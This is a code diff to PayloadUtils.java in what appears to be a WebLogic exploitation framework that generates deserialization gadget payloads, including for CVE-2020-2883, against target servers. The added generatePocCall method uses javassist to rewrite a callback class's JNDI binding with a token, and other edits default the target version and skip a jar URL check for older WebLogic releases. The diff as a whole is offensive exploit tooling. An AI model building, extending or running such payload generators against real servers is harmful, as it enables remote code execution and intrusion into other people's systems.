@@ -15,6 +15,7 @@
 
 package com.weblogic.framework.utils;
 
+import com.weblogic.framework.call.Call;
 import com.weblogic.framework.entity.ContextPojo;
 import com.weblogic.framework.entity.GadgetParam;
 import com.weblogic.framework.entity.MyException;
@@ -22,6 +23,10 @@ import com.weblogic.framework.gadget.ObjectGadget;
 import com.weblogic.framework.entity.VulCheckParam;
 import com.weblogic.framework.vuls.impl.CVE_2020_2883;
 import com.weblogic.framework.vuls.VulTest;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtField;
+import javassist.NotFoundException;
 
 import javax.naming.Context;
 import java.net.URL;
@@ -52,6 +57,22 @@ public class PayloadUtils {
      */
     private PayloadUtils(){}
 
+    /**
+     * 生成回调 POC
+     * @param callName
+     * @param token
+     * @return
+     */
+    public static Object generatePocCall(String callName, String token, String path) throws Exception {
+        callName = isBlank(callName) ? DEFAULT_CALL : callName;
+        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.getAndRename(callClazz.getName(), callClazz.getSimpleName());
+        ctClass.getDeclaredMethod("jndiBind").insertBefore("$1=\""+token+"\";");
+        ctClass.writeFile("E:\\projects\\Idea-workspace\\weblogic-framework\\");
+        return null;
+    }
+
     public static Object generatePayload(final Class<? extends ObjectGadget<?>> clazz, VulCheckParam vulCheckParam) throws Exception {
         ObjectGadget<?> payload = clazz.newInstance();
 //        payload.getObject();
@@ -76,7 +97,7 @@ public class PayloadUtils {
             vulCheckParam.setVersion(getVersion(checkURL.getHost(), checkURL.getPort() == -1 ? 80: checkURL.getPort()));
         }
         String version = vulCheckParam.getVersion();
-//        VulTest vulTest = payloadClazz.newInstance();
+        version = isBlank(version) ? "10.3.6.0" :version;
         String[] VUL_VERSIONS = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_VERSIONS");
         String[] VUL_DEPENDENCIES = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_DEPENDENCIES");
         Boolean versionFlag = checkVersion(version,VUL_VERSIONS);
@@ -87,10 +108,12 @@ public class PayloadUtils {
         if(version.contains("12.1.3.0")){
             javascriptUrl = "";
         }else{
-            if(isBlank(vulCheckParam.getJavascriptUrl())){
+            if(isBlank(vulCheckParam.getJavascriptUrl()) && !version.contains("10.3.6")){
                 throw new MyException("javascript.jar 链接不能为空");
             }
-            checkJavascriptUrl(vulCheckParam.getJavascriptUrl());
+            if(!version.contains("10.3.6") && !version.contains("10.3.5")){
+                checkJavascriptUrl(vulCheckParam.getJavascriptUrl());
+            }
             javascriptUrl = vulCheckParam.getJavascriptUrl();
         }
         URLClassLoader urlClassLoader = loadJar(version,VUL_DEPENDENCIES);
@@ -129,7 +152,6 @@ public class PayloadUtils {
             System.out.println(result);
             return result.contains("a136d86442181f45a4446f5fb8a49f7f");
         }catch (Exception e){
-            e.printStackTrace();
             return false;
         }finally {
             // 设置为 null，强制让 GC 回收
@@ -139,8 +161,7 @@ public class PayloadUtils {
     }
 
     public static void main(String[] args) throws Exception {
-        Object object = CVE_2020_2883.class.newInstance();
-        String[] VUL_VERSIONS = (String[]) ReflectionUtils.getFieldValue(object, "VUL_VERSIONS");
-        System.out.println(VUL_VERSIONS);
+        generatePocCall(null,"123143124",null);
     }
+
 }
